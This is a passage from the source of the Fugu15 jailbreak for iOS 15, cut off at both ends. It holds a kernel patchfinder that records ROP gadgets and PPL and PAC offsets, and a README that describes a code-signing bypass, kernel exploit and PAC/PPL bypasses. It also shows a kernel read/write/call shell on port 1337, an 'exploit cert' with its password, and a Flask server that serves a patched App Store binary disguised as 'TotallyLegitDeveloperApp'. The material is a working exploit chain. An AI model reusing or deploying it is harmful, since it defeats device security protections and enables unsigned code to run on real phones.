            guard let pmap_enter_options_addr = pf.pmap_enter_options_addr else {
                Logger.print("Failed: pf.pmap_enter_options_addr")
                break
            }
            
            writeOffsetInfo(4, value: pmap_enter_options_addr)
            
            guard let hw_lck_ticket_reserve_orig_allow_invalid_signed = pf.hw_lck_ticket_reserve_orig_allow_invalid_signed else {
                Logger.print("Failed: pf.hw_lck_ticket_reserve_orig_allow_invalid_signed")
                break
            }
            
            writeOffsetInfo(5, value: hw_lck_ticket_reserve_orig_allow_invalid_signed)
            
            guard let hw_lck_ticket_reserve_orig_allow_invalid = pf.hw_lck_ticket_reserve_orig_allow_invalid else {
                Logger.print("Failed: pf.hw_lck_ticket_reserve_orig_allow_invalid")
                break
            }
            
            writeOffsetInfo(6, value: hw_lck_ticket_reserve_orig_allow_invalid)
            
            guard let br_x22_gadget = pf.br_x22_gadget else {
                Logger.print("Failed: pf.br_x22_gadget")
                break
            }
            
            writeOffsetInfo(7, value: br_x22_gadget)
            
            guard let exception_return = pf.exception_return else {
                Logger.print("Failed: pf.exception_return")
                break
            }
            
            writeOffsetInfo(8, value: exception_return)
            
            guard let ldp_x0_x1_x8_gadget = pf.ldp_x0_x1_x8_gadget else {
                Logger.print("Failed: pf.ldp_x0_x1_x8_gadget")
                break
            }
            
            writeOffsetInfo(9, value: ldp_x0_x1_x8_gadget)
            
            guard let exception_return_after_check = pf.exception_return_after_check else {
                Logger.print("Failed: pf.exception_return_after_check")
                break
            }
            
            writeOffsetInfo(10, value: exception_return_after_check)
            
            guard let exception_return_after_check_no_restore = pf.exception_return_after_check_no_restore else {
                Logger.print("Failed: pf.exception_return_after_check_no_restore")
                break
            }
            
            writeOffsetInfo(11, value: exception_return_after_check_no_restore)
            
            guard let str_x8_x9_gadget = pf.str_x8_x9_gadget else {
                Logger.print("Failed: pf.str_x8_x9_gadget")
                break
            }
            
            writeOffsetInfo(12, value: str_x8_x9_gadget)
            
            guard let str_x0_x19_ldr_x20 = pf.str_x0_x19_ldr_x20 else {
                Logger.print("Failed: pf.str_x0_x19_ldr_x20")
                break
            }
            
            writeOffsetInfo(13, value: str_x0_x19_ldr_x20)
            
            guard let pmap_set_nested = pf.pmap_set_nested else {
                Logger.print("Failed: pf.pmap_set_nested")
                break
            }
            
            writeOffsetInfo(14, value: pmap_set_nested)
            
            guard let pmap_nest = pf.pmap_nest else {
                Logger.print("Failed: pf.pmap_nest")
                break
            }
            
            writeOffsetInfo(15, value: pmap_nest)
            
            guard let pmap_remove_options = pf.pmap_remove_options else {
                Logger.print("Failed: pf.pmap_remove_options")
                break
            }
            
            writeOffsetInfo(16, value: pmap_remove_options)
            
            guard let pmap_mark_page_as_ppl_page = pf.pmap_mark_page_as_ppl_page else {
                Logger.print("Failed: pf.pmap_mark_page_as_ppl_page")
                break
            }
            
            writeOffsetInfo(17, value: pmap_mark_page_as_ppl_page)
            
            guard let pmap_create_options = pf.pmap_create_options else {
                Logger.print("Failed: pf.pmap_create_options")
                break
            }
            
            writeOffsetInfo(18, value: pmap_create_options)
            
            guard let ml_sign_thread_state = pf.ml_sign_thread_state else {
                Logger.print("Failed: pf.ml_sign_thread_state")
                break
            }
            
            writeOffsetInfo(19, value: ml_sign_thread_state)
            
            guard let kernel_el = pf.kernel_el else {
                Logger.print("Failed: pf.kernel_el")
                break
            }
            
            writeOffsetInfo(20, value: kernel_el << 2)
            
            guard let TH_RECOVER = pf.TH_RECOVER else {
                Logger.print("Failed: pf.TH_RECOVER")
                break
            }
            
            writeOffsetInfo(21, value: TH_RECOVER)
            
            guard let TH_KSTACKPTR = pf.TH_KSTACKPTR else {
                Logger.print("Failed: pf.TH_KSTACKPTR")
                break
            }
            
            writeOffsetInfo(22, value: TH_KSTACKPTR)
            
            guard let ACT_CONTEXT = pf.ACT_CONTEXT else {
                Logger.print("Failed: pf.ACT_CONTEXT")
                break
            }
            
            writeOffsetInfo(23, value: ACT_CONTEXT)
            
            guard let ACT_CPUDATAP = pf.ACT_CPUDATAP else {
                Logger.print("Failed: pf.ACT_CPUDATAP")
                break
            }
            
            writeOffsetInfo(24, value: ACT_CPUDATAP)
            
            var PORT_KOBJECT: UInt64 = 0x58
            if ProcessInfo.processInfo.operatingSystemVersion.majorVersion >= 15 && ProcessInfo.processInfo.operatingSystemVersion.minorVersion >= 2 {
                PORT_KOBJECT = 0x48
            }
            
            writeOffsetInfo(25, value: PORT_KOBJECT)
            
            guard let VM_MAP_PMAP = pf.VM_MAP_PMAP else {
                Logger.print("Failed: pf.VM_MAP_PMAP")
                break
            }
            
            writeOffsetInfo(26, value: VM_MAP_PMAP)
            
            guard let PORT_LABEL = pf.PORT_LABEL else {
                Logger.print("Failed: pf.PORT_LABEL")
                break
            }
            
            writeOffsetInfo(27, value: PORT_LABEL)
            
            Logger.print("Patchfinding took \(time(nil) - start) second(s)!")
            
            ok = true
        } while false
        
        state.__x.0 = ok ? 1 : 0
        
        let lr = thread_state64_get_lr(&state)
        thread_state64_set_pc(&state, lr)
        
        return ok ? KERN_SUCCESS : KERN_FAILURE
    }
    
    static func oobPCIRequest(id: UInt64, addrPid: UInt64, size: UInt64 = 0, buf: Data? = nil) -> (status: UInt64, result: UInt64, data: Data?) {
        // Take the request lock
        requestLock.lock()
        
        // Write request
        request        = id
        requestAddrPid = addrPid
        requestSize    = size
        requestBuf     = buf
        
        // Ensure all writes are visible
        OSMemoryBarrier()
        
        // Send the request
        sendRequestLock.unlock()
        
        // Acquire reply lock
        replyLock.lock()
        
        // Ensure all writes are visible
        OSMemoryBarrier()
        
        let res = (status: replyStatus, result: replyResult, data: replyBuf)
        
        // Ensure read is not re-ordered
        OSMemoryBarrier()
        
        requestLock.unlock()
        
        return res
    }
    
    /*static func oobPCIMapMagicPage(pid: pid_t) -> PPLRW? {
        let rsp = oobPCIRequest(id: 7, addrPid: UInt64(pid))
        guard rsp.status == 0 else {
            Logger.print("oobPCI failed to map magic PPL page! Status: \(rsp.status)")
            return nil
        }
        
        return PPLRW(magicPage: rsp.result)
    }*/
}

```

`Packages/ProcessCommunication/Package.swift`:

```swift
// swift-tools-version:5.4
// The swift-tools-version declares the minimum version of Swift required to build this package.

import PackageDescription

let package = Package(
    name: "ProcessCommunication",
    platforms: [
        .iOS(.v14),
        .macOS(.v11)
    ],
    products: [
        // Products define the executables and libraries a package produces, and make them visible to other packages.
        .library(
            name: "ProcessCommunication",
            targets: ["ProcessCommunication"])
    ],
    targets: [
        // Targets are the basic building blocks of a package. A target can define a module or a test suite.
        // Targets can depend on other targets in this package, and on products in packages this package depends on.
        .target(
            name: "ProcessCommunication",
            dependencies: []),
    ]
)

```

`Packages/ProcessCommunication/README.md`:

```md
# ProcessCommunication

Simple process communication library.

```

`Packages/ProcessCommunication/Sources/ProcessCommunication/ProcessCommunication.swift`:

```swift
//
//  ProcessCommunication.swift
//  ProcessCommunication
//
//  Created by Linus Henze.
//  Copyright © 2021/2022 Pinauten GmbH. All rights reserved.
//

import Foundation

public class ProcessCommunication {
    public let read: FileHandle
    public let write: FileHandle
    
    public init(read: FileHandle, write: FileHandle) {
        self.read = read
        self.write = write
    }
    
    public func receiveCommand() -> [String]? {
        var result: [String] = []
        var buf = Data()
        while true {
            do {
                let data = try read.read(upToCount: 1)
                if data == nil || data?.count == 0 {
                    return nil
                }
                
                if data.unsafelyUnwrapped[0] == 0 {
                    result.append(String(data: buf, encoding: .utf8) ?? "")
                    return result
                } else if data.unsafelyUnwrapped[0] == 1 {
                    result.append(String(data: buf, encoding: .utf8) ?? "")
                    buf = Data()
                } else {
                    buf += data.unsafelyUnwrapped
                }
            } catch _ {
                return nil
            }
        }
    }
    
    @discardableResult
    public func sendCommand(_ args: [String]) -> Bool {
        do {
            var iter = args.makeIterator()
            var cur  = iter.next()
            while cur != nil {
                try write.write(contentsOf: cur.unsafelyUnwrapped.data(using: .utf8) ?? Data())
                
                cur = iter.next()
                if cur != nil {
                    try write.write(contentsOf: Data(repeating: 1, count: 1))
                } else {
                    try write.write(contentsOf: Data(repeating: 0, count: 1))
                }
            }
            
            return true
        } catch _ {
            return false
        }
    }
    
    @discardableResult
    public func sendCommand(_ args: String...) -> Bool {
        sendCommand(args)
    }
}

```

`README.md`:

```md
# Fugu15
Fugu15 is a semi-untethered permasigned jailbreak for iOS 15.  
It contains a code-signing bypass, kernel exploit, kernel PAC bypass and PPL bypass.  
Additionally, it can be installed via Safari, i.e. a computer is not required, except for a Web Server that hosts Fugu15.  
Please note that Fugu15 does not support tweaks (no tweak injection library).

# Tested Devices and iOS Versions
- iPhone Xs Max: iOS 15.4.1
- iPhone 11 (SRD): iOS 15.4.1
- iPhone 12 (SRD): iOS 15.4.1
- iPhone 12 Pro Max: iOS 15.4.1
- iPhone 13: iOS 15.1 (offline edition - see bugs below [WiFi bug])

Other devices are probably supported as well.  
Non-arm64e devices are not supported.

# Building
Prerequisites:  
1. Make sure you have Xcode ~~13/14~~ 14.1 installed
2. Import the fastPath arm certificate (`Exploits/fastPath/arm.pfx`) into your Keychain (double click on the file). The password is "password" (without quotes)
3. You need a validly signed copy of Apple's Developer App from the AppStore (with DRM!). Copy the IPA to `Server/orig.ipa`. Note that if you would like to use a different AppStore App you will need to get it's Team ID and add `TEAMID=<the App's Team ID>` to all `make` commands

Now you can simply run `make` to build Fugu15 (internet connection required to download dependencies).  
Please note that you will be asked to grant "fastPathSign" access to the Keychain item "privateKey" (the private key of the fastPath certificate). Enter your password and select "Always allow".

## Building Tools
Building Fugu15 requires multiple Tools which can be found in the `Tools` directory. Building them is entirely optional because I've already compiled them.  
If you want to build them yourself, simply run `make` in the `Tools` directory.

# Installing
There are two ways to install Fugu15 on your device: Via Safari or via USB

## Installing via Safari
To install Fugu15 via Safari, do the following (requires you to own a domain):  
1. Make sure your device is connected to the same network as your computer
2. Change the DNS A record for a domain you own to the local IP-Address of your computer
3. Obtain a certificate for your domain (e.g. via Let's Encrypt) and copy it to `Server/serverCert/fullchain.cer` (the certificate itself) and `Server/serverCert/server.key` (private key)
4. Make sure you have Flask installed (`pip3 install Flask`)
5. Change `serverUrl` in `Server/server.py` to your domain
6. Run `python3 server.py` in the `Server` directory
7. Visit `https://<your domain>` on your iPhone and follow the instructions

## Installing via USB
1. Install `Fugu15_Developer.ipa`, e.g. via `ideviceinstaller -i Fugu15_Developer.ipa`. Alternatively, install Fugu15/Fugu15.ipa via TrollStore.
2. Open the newly installed "Developer" App (or whatever AppStore App you used) on your iPhone

# iDownload
Like all Fugu jailbreaks, Fugu15 ships with iDownload. The iDownload shell can be accessed on port 1337 (run `iproxy 1337 1337 &` and then `nc 127.1 1337` to connect to iDownload).  
Type `help` to see a list of supported commands.  
The following commands are especially useful:
- `r64/r32/r16/r8 <address>`: Read a 64/32/16/8 bit integer at the given kernel address. Add the `@S` suffix to slide the given address or `@P` to read from a physical address.
- `w64/w32/w16/w8 <address> <value>`: Write the given 64/32/16/8 bit integer to the given kernel address. Also supports the suffixes described above and additionally `@PPL` to write to a PPL protected address (see `krwhelp`).
- `kcall <address> <up to 8 arguments>`: Call the kernel function at the given address, passing up to 8 64-Bit integer arguments.
- `tcload <path to TrustCache>`: Load the given TrustCache into the kernel

# Procursus Bootstrap and Sileo
Fugu15 also ships with the procursus bootstrap and Sileo. Run the `bootstrap` command in iDownload to install both. Afterwards, you might have to respring to force Sileo to show up on the Home Screen (`uicache -r`).

Procursus is installed into the `/private/preboot/jb` directory and `/var/jb` is a symlink to it.

# Known Issues/Bugs
1. If oobPCI (the process exploiting the kernel) exits, the system might be left in an inconsistent state and panic at some point. This usually occurs about 5 seconds after running the `exit_full` command in iDownload.  
Workaround: Don't quit oobPCI or make sure to do it as fast as possible to reduce the chance of a kernel panic. The reason for this panic is currently unknown.
2. When not connected to power, entering deep sleep will cause a kernel panic due to a bug in DriverKit (also happened with Fugu14). Unfortunately, the fix from Fugu14 does not work on iOS 15.  
Workaround: This bug will not occur when quitting oobPCI. However, the bug described above may occur when oobPCI exits.
3. Some iOS versions (at least iOS 15.1 and below, maybe 15.2 and 15.3 too) have a DriverKit bug which causes bus mastering to be disabled for the WiFi chip when running oobPCI, causing a kernel panic when WiFi is used. This bug can be fixed but a fix is not included in Fugu15 at the moment.  
Workaround: Disable WiFi.

# FAQ
Q: I'm an end user. Is Fugu15 useful to me?  
A: No.  

Q: My iOS version/device is not supported by Fugu15, will you add support for it?  
A: No. (I'm done with iOS 15)  

Q: Will you ever add support for tweak injection?  
A: No.  

Q: Do you provide official support for Fugu15? Are any updates planned?  
A: No.  

Q: I installed/updated something through Sileo but it won't launch. How can I fix that?  
A: Fugu15 uses TrustCache injection to bypass code signing. Therefore, if you install or update something, it's code signature must be in a TrustCache. You can load additional TrustCaches from the iDownload shell via the `tcload` command.  

Q: Wen eta Fugu16??????  
A: ...  

# Credits
The following open-source software is used by Fugu15:
- [Procursus Bootstrap](https://github.com/ProcursusTeam/Procursus): The bootstrap used by Fugu15. License: [BSD 0-Clause](https://github.com/ProcursusTeam/Procursus/blob/main/LICENSE). The tools included in the bootstrap are released under many different licenses, please see the procursus repo for more information
- [Sileo](https://github.com/Sileo/Sileo): The package manager included in Fugu15. License: [BSD 4-Clause](https://github.com/Sileo/Sileo/blob/stable/LICENSE)
- [ZIPFoundation](https://github.com/weichsel/ZIPFoundation): Swift library for working with ZIP archives. Used in FuguInstall to install the Fugu15 App. License: [MIT](https://github.com/weichsel/ZIPFoundation/blob/development/LICENSE)

# License
MIT. See the `LICENSE` file.

```

`Server/buildIPA.py`:

```py
import zipfile
import io
import plistlib
import subprocess

def buildIPA(appStoreIPA, fuguInstall, otherIPA, installHaxx="../Tools/installHaxx/installHaxx"):
    with open(appStoreIPA, "rb") as f:
        ipa = io.BytesIO(b"")
        ipaNewZip = zipfile.ZipFile(ipa, "w")
        ipaZip = zipfile.ZipFile(f, "r")

        # Get data from Info.plist
        payload = list(zipfile.Path(ipaZip, "Payload/").iterdir())
        if len(payload) != 1:
            print("Invalid IPA file!")
            exit(-1)
            
        theApp = payload[0]
        infoPlist = plistlib.loads(theApp.joinpath("Info.plist").read_bytes())

        bundleId      = infoPlist["CFBundleIdentifier"]
        bundleVersion = infoPlist["CFBundleVersion"]
        bundleName    = infoPlist["CFBundleDisplayName"]

        appBinaryPath = infoPlist["CFBundleExecutable"]
        appBinaryPath = theApp.joinpath(appBinaryPath)
        appBinary     = appBinaryPath.read_bytes()

        patchedBinary = subprocess.check_output([installHaxx, "-", fuguInstall, "-", otherIPA], input=appBinary)
        
        for item in ipaZip.infolist():
            buffer = ipaZip.read(item.filename)
            if item.filename == appBinaryPath.at:
                ipaNewZip.writestr(item, patchedBinary)
            else:
                ipaNewZip.writestr(item, buffer)
            
        ipaNewZip.comment = ipaZip.comment

        ipaZip.close()
        ipaNewZip.close()
        
        ipa.seek(0)
        return ipa.read()

if __name__ == "__main__":
    import sys
    import os
    
    if len(sys.argv) < 3:
        print("Usage: buildIPA.py <path to other IPA> <output path> <optional path to AppStore IPA> <optional path to FuguInstall> <optional path to installHaxx binary>")
        exit(-1)
    
    base = os.path.dirname(sys.argv[0])
    if base == '':
        base = '.'
        
    otherIPA    = sys.argv[1]
    output      = sys.argv[2]
    appStoreIPA = sys.argv[3] if len(sys.argv) >= 4 else (base + "/orig.ipa")
    fuguInstall = sys.argv[4] if len(sys.argv) >= 5 else (base + "/FuguInstall")
    installHaxx = sys.argv[5] if len(sys.argv) >= 6 else (base + "/../Tools/installHaxx/installHaxx")

    with open(output, "wb+") as f:
        f.write(buildIPA(appStoreIPA, fuguInstall, otherIPA, installHaxx))

```

`Server/server.py`:

```py
from flask import Flask, request, render_template, make_response, after_this_request, Response
import uuid
import zipfile
import io
import plistlib
import subprocess

serverUrl = "jbme.pinauten.de"

with open("orig.ipa", "rb") as f:
    ipa = io.BytesIO(b"")
    ipaNewZip = zipfile.ZipFile(ipa, "w")
    ipaZip = zipfile.ZipFile(f, "r")

    # Get data from Info.plist
    payload = list(zipfile.Path(ipaZip, "Payload/").iterdir())
    if len(payload) != 1:
        print("Invalid IPA file!")
        exit(-1)
        
    theApp = payload[0]
    infoPlist = plistlib.loads(theApp.joinpath("Info.plist").read_bytes())

    bundleId      = infoPlist["CFBundleIdentifier"]
    bundleVersion = infoPlist["CFBundleVersion"]
    bundleName    = infoPlist["CFBundleDisplayName"]

    appBinaryPath = infoPlist["CFBundleExecutable"]
    appBinaryPath = theApp.joinpath(appBinaryPath)
    appBinary     = appBinaryPath.read_bytes()

    patchedBinary = subprocess.check_output(["../Tools/installHaxx/installHaxx", "-", "FuguInstall", "-", "Fugu15.ipa"], input=appBinary)
    
    for item in ipaZip.infolist():
        buffer = ipaZip.read(item.filename)
        if item.filename == appBinaryPath.at:
            ipaNewZip.writestr(item, patchedBinary)
        else:
            ipaNewZip.writestr(item, buffer)
        
    ipaNewZip.comment = ipaZip.comment

    ipaZip.close()
    ipaNewZip.close()

ipa.seek(0)
ipaData = ipa.read()
with open("Fugu.ipa", "wb+") as f:
    f.write(ipaData)

app = Flask(__name__)

ipaDownloadStarted = []
ipaDownloadDone    = []

@app.route("/")
def main_site():
    key = str(uuid.uuid4())
    return render_template("index.html", key=key, server=serverUrl, appName=bundleName)
    
@app.route("/didStartIPADownload")
def didStartIPADownload():
    key = request.args.get("key", None)
    if key is None:
        return {"error": "No key given"}

    return {"result": key in ipaDownloadStarted}

@app.route("/didDownloadIPA")
def didDownloadIPA():
    key = request.args.get("key", None)
    if key is None:
        return {"error": "No key given"}

    return {"result": key in ipaDownloadDone}

@app.route("/<key>/manifest.plist")
def getInfoPlist(key):
    response = make_response(render_template("manifest.plist", key=key, server=serverUrl, bundleId=bundleId, bundleVersion=bundleVersion, title="TotallyLegitDeveloperApp"))
    response.headers["Content-Type"] = "text/xml"
    return response

@app.route("/<key>/app.ipa")
def getIPA(key):
    global ipaDownloadStarted
    ipaDownloadStarted += [key]
    
    def generate():
        global ipaDownloadDone
        yield ipaData
        ipaDownloadDone += [key]
    
    return Response(generate(), content_type="application/octet-stream")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, debug=False, ssl_context=("serverCert/fullchain.cer", "serverCert/server.key"))

```

`Server/serverCert/README.md`:

```md
Obtain a certificate for your domain (e.g. via Let's Encrypt) and copy it to this folder as `fullchain.cer` (the certificate itself) and `server.key` (private key)

```

`Server/templates/index.html`:

```html
<body style="width: 100%; height: 100%">
    <div style="width: 100%; text-align: center; bottom: 50%; position: absolute; font-size: 48px;">
        Instructions:<br/>
        Tap the link below and select "Install" in the prompt that appears. Then open the newly installed "{{ appName }}" App from your Home Screen.<br/><br/>
        <a href="itms-services://?action=download-manifest&url=https://{{ server }}/{{ key }}/manifest.plist">Tap here to install Fugu15!</a>
    </div>
</body>

```

`Server/templates/manifest.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>items</key>
	<array>
		<dict>
			<key>assets</key>
			<array>
				<dict>
					<key>kind</key>
					<string>software-package</string>
					<key>url</key>
					<string>https://{{ server }}/{{ key }}/app.ipa</string>
				</dict>
				<dict>
					<key>kind</key>
					<string>display-image</string>
					<key>url</key>
					<string>https://{{ server }}/static/FuguInstall_57_57.png</string>
				</dict>
				<dict>
					<key>kind</key>
					<string>full-size-image</string>
					<key>url</key>
					<string>https://{{ server }}/static/FuguInstall_512_512.png</string>
				</dict>
			</array>
			<key>metadata</key>
			<dict>
				<key>bundle-identifier</key>
				<string>{{ bundleId }}</string>
				<key>bundle-version</key>
				<string>{{ bundleVersion }}</string>
				<key>kind</key>
				<string>software</string>
				<key>platform-identifier</key>
				<string>com.apple.platform.iphoneos</string>
				<key>title</key>
				<string>{{ title }}</string>
			</dict>
		</dict>
	</array>
</dict>
</plist>

```

`Tools/Exe2Driver/Makefile`:

```
TARGET=Exe2Driver
CONFIG=release

include ../Makefile.inc

```

`Tools/Exe2Driver/Package.resolved`:

```resolved
{
  "object": {
    "pins": [
      {
        "package": "SwiftMachO",
        "repositoryURL": "https://github.com/pinauten/SwiftMachO",
        "state": {
          "branch": "master",
          "revision": "d433b349d7e69bb8fd5d18ea5cdbcd8b731ddf55",
          "version": null
        }
      },
      {
        "package": "SwiftUtils",
        "repositoryURL": "https://github.com/pinauten/SwiftUtils",
        "state": {
          "branch": "master",
          "revision": "1d37faabb4c58b3152394c9b6e1c1a68507646b9",
          "version": null
        }
      }
    ]
  },
  "version": 1
}

```

`Tools/Exe2Driver/Package.swift`:

```swift
// swift-tools-version:5.3
// The swift-tools-version declares the minimum version of Swift required to build this package.

import PackageDescription

let package = Package(
    name: "Exe2Driver",
    platforms: [
        .macOS(.v11)
    ],
    products: [
        // Products define the executables and libraries a package produces, and make them visible to other packages.
        .executable(
            name: "Exe2Driver",
            targets: ["Exe2Driver"]),
    ],
    dependencies: [
        // Dependencies declare other packages that this package depends on.
        .package(name: "SwiftUtils", url: "https://github.com/pinauten/SwiftUtils", .branch("master")),
        .package(name: "SwiftMachO", url: "https://github.com/pinauten/SwiftMachO", .branch("master"))
    ],
    targets: [
        // Targets are the basic building blocks of a package. A target can define a module or a test suite.
        // Targets can depend on other targets in this package, and on products in packages this package depends on.
        .target(
            name: "Exe2Driver",
            dependencies: ["SwiftUtils", "SwiftMachO"])
    ]
)

```

`Tools/Exe2Driver/README.md`:

```md
# Exe2Driver

Exe2Driver can be used to convert a regular executable into a DriverKit driver which can then be launched using SpawnDrv/kexploitd.

```

`Tools/Exe2Driver/Sources/Exe2Driver/main.swift`:

```swift
//
//  main.swift
//  Exe2Driver
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import Darwin
import SwiftUtils
import SwiftMachO
import MachO

func fail(_ msg: String, _ args: CVarArg...) -> Never {
    print(String(format: msg, arguments: args))
    exit(-1)
}

guard CommandLine.arguments.count >= 3 else {
    fail("Usage: Exe2Driver <path to exe> <driver output path>")
}

// We use the MachO module just to parse FAT files
// Unfortunately, it does not support editing MachO files right now
var machO: Data!
do {
    machO = try MachO(fromFile: CommandLine.arguments[1]).data
} catch {
    fail("Failed to read MachO file at '\(CommandLine.arguments[1])'!")
}

guard let hdr = machO.tryGetGeneric(type: mach_header_64.self) else {
    fail("Bad file size!")
}

guard hdr.magic == MH_MAGIC_64 else {
    fail("Not a MachO!")
}

// Iterate over all load commands to find LC_BUILD_VERSION and LC_MAIN

var foundBuildVersion = false, foundMain = false

guard let ncmds = machO.tryGetGeneric(type: UInt32.self, offset: 0x10) else {
    fail("Bad file size!")
}

guard let cmds_size = machO.tryGetGeneric(type: UInt32.self, offset: 0x14) else {
    fail("Bad file size!")
}

guard (cmds_size + 0x20) <= machO.count else {
    fail("Bad file size!")
}

var pos = 0x20
for _ in 0..<ncmds {
    guard let cmd = machO.tryGetGeneric(type: load_command.self, offset: UInt(pos)) else {
        fail("Bad file (size)!")
    }
    
    if cmd.cmd == LC_BUILD_VERSION,
       cmd.cmdsize >= MemoryLayout<build_version_command>.size {
        // Modify the command
        // Set platform to driverkit
        machO.withUnsafeMutableBytes { (ptr: UnsafeMutableRawBufferPointer) in
            let bvc = ptr.baseAddress!.advanced(by: pos).assumingMemoryBound(to: build_version_command.self)
            bvc.pointee.platform = UInt32(PLATFORM_DRIVERKIT)
        }
        
        foundBuildVersion = true
    } else if cmd.cmd == LC_MAIN,
              cmd.cmdsize >= MemoryLayout<entry_point_command>.size {
        // "Hide" the command by changing it's type
        machO.withUnsafeMutableBytes { (ptr: UnsafeMutableRawBufferPointer) in
            let epc = ptr.baseAddress!.advanced(by: pos).assumingMemoryBound(to: entry_point_command.self)
            epc.pointee.cmd = 0x13371337
        }
        
        foundMain = true
    }
    
    if foundBuildVersion && foundMain {
        break
    }
    
    pos += Int(cmd.cmdsize)
}

if !foundBuildVersion {
    fail("MachO does not contain the required LC_BUILD_VERSION load command!")
}

if !foundMain {
    fail("MachO does not contain the required LC_MAIN load command!")
}

do {
    try machO.write(to: URL(fileURLWithPath: CommandLine.arguments[2]))
} catch {
    fail("Failed to write patched driver to '\(CommandLine.arguments[2])'!")
}

print("Successfully patched executable!")
print("Wrote driver to '\(CommandLine.arguments[2])'.")

```

`Tools/Makefile`:

```
TARGETS=fastPathSign BuildVFS Exe2Driver installHaxx
TARGETS_CLEAN=$(addsuffix _clean, $(TARGETS))
TARGETS_BUILD_CLEAN=$(addsuffix _build_clean, $(TARGETS))

all: $(TARGETS)
clean: $(TARGETS_CLEAN)
build_clean: $(TARGETS_BUILD_CLEAN)

.PHONY: all clean build_clean

$(TARGETS): FORCE
	@echo make -C $@
	@$(MAKE) -C $@

$(TARGETS_CLEAN): FORCE
	@echo make -C $(@:_clean=) clean
	@$(MAKE) -C $(@:_clean=) clean

$(TARGETS_BUILD_CLEAN): FORCE
	@echo make -C $(@:_build_clean=) build_clean
	@$(MAKE) -C $(@:_build_clean=) build_clean

FORCE: ;

```

`Tools/Makefile.inc`:

```inc
SWIFT_BUILD_ARGS=-c $(CONFIG)

SWIFT_BUILD_ARGS_X86_64=$(SWIFT_BUILD_ARGS) -Xswiftc -target -Xswiftc x86_64-apple-macos12.0
SWIFT_BUILD_ARGS_ARM64=$(SWIFT_BUILD_ARGS) -Xswiftc -target -Xswiftc arm64-apple-macos12.0

all: $(TARGET)

build_clean:
	rm -rf .build_x86_64 .build_arm64

clean: build_clean
	rm -f $(TARGET)

.PHONY: all build_clean clean

.build_x86_64/$(CONFIG)/$(TARGET): FORCE
	swift build --build-path .build_x86_64 $(SWIFT_BUILD_ARGS_X86_64)
    
.build_arm64/$(CONFIG)/$(TARGET): FORCE
	swift build --build-path .build_arm64  $(SWIFT_BUILD_ARGS_ARM64)

$(TARGET): .build_x86_64/$(CONFIG)/$(TARGET) .build_arm64/$(CONFIG)/$(TARGET)
	lipo -create .build_x86_64/$(CONFIG)/$(TARGET) .build_arm64/$(CONFIG)/$(TARGET) -output $(TARGET)

FORCE: ;

```

`Tools/fastPathSign/Makefile`:

```
TARGET=fastPathSign
CONFIG=release

include ../Makefile.inc

```

`Tools/fastPathSign/Package.swift`:

```swift
// swift-tools-version:5.4
// The swift-tools-version declares the minimum version of Swift required to build this package.

import PackageDescription

let package = Package(
    name: "fastPathSign",
    platforms: [
        .macOS(.v11)
    ],
    products: [
        // Products define the executables and libraries a package produces, and make them visible to other packages.
        .executable(
            name: "fastPathSign",
            targets: ["fastPathSign"]),
    ],
    targets: [
        // Targets are the basic building blocks of a package. A target can define a module or a test suite.
        // Targets can depend on other targets in this package, and on products in packages this package depends on.
        .systemLibrary(name: "Security_Codesign"),
        .executableTarget(
            name: "fastPathSign",
            dependencies: ["Security_Codesign"])
    ]
)

```

`Tools/fastPathSign/README.md`:

```md
# fastPathSign

fastPathSign is a tool to re-sign MachO's with the fastPath exploit cert.

# Prerequisites

Make sure you imported the fastPath exploit certificate into your Keychain (Exploits/fastPath/arm.pfx, password: "password").  
The certificate must be named "Pinauten PWN Cert".

# Usage

First ad-hoc sign the MachO, including the entitlements you need.  
Then run `fastPathSign <path to your MachO>` to re-sign your MachO. This will keep the entitlements, identifier, etc.

```

`Tools/fastPathSign/Sources/Security_Codesign/SecCodeSigner.h`:

```h
/*
 * Copyright (c) 2006-2014 Apple Inc. All Rights Reserved.
 * 
 * @APPLE_LICENSE_HEADER_START@
 * 
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this
 * file.
 * 
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 * 
 * @APPLE_LICENSE_HEADER_END@
 */

/*!
	@header SecCodeSigner
	SecCodeSigner represents an object that can sign code.
*/
#ifndef _H_SECCODESIGNER
#define _H_SECCODESIGNER

#ifdef __cplusplus
extern "C" {
#endif

#include <Security/CSCommon.h>
#include <Security/CMSEncoder.h>

/*!
	@typedef SecCodeSignerRef
	This is the type of a reference to a code requirement.
*/
#ifdef BRIDGED_SECCODESIGNER
typedef struct CF_BRIDGED_TYPE(id) __SecCodeSigner *SecCodeSignerRef;	/* code signing object */
#else
typedef struct __SecCodeSigner *SecCodeSignerRef;	/* code signing object */
#endif

extern const CFStringRef kSecCodeInfoResourceDirectory;        /* Internal */

OSStatus CMSEncoderSetSigningTime(
    CMSEncoderRef        cmsEncoder,
    CFAbsoluteTime        time);

OSStatus CMSEncoderSetAppleCodesigningHashAgilityV2(
    CMSEncoderRef       cmsEncoder,
    CFDictionaryRef     hashAgilityV2AttrValues);

OSStatus CMSEncoderSetAppleCodesigningHashAgility(
        CMSEncoderRef   cmsEncoder,
        CFDataRef       hashAgilityAttrValue);


/*!
	@function SecCodeGetTypeID
	Returns the type identifier of all SecCodeSigner instances.
*/
CFTypeID SecCodeSignerGetTypeID(void);


/*!
	The following CFString constants can be used as keys in the parameters argument
	of SecCodeSignerCreate to specify various modes and options of the signing operation.
	Passing any keys not specified here may lead to undefined behavior and is not supported.
	The same applies to passing objects of types not explicitly allowed here.

	@constant kSecCodeSignerDetached Determines where the signature is written.
		If this key is absent, the code being signed is modified to contain the signature,
		replacing any signature already embedded there.
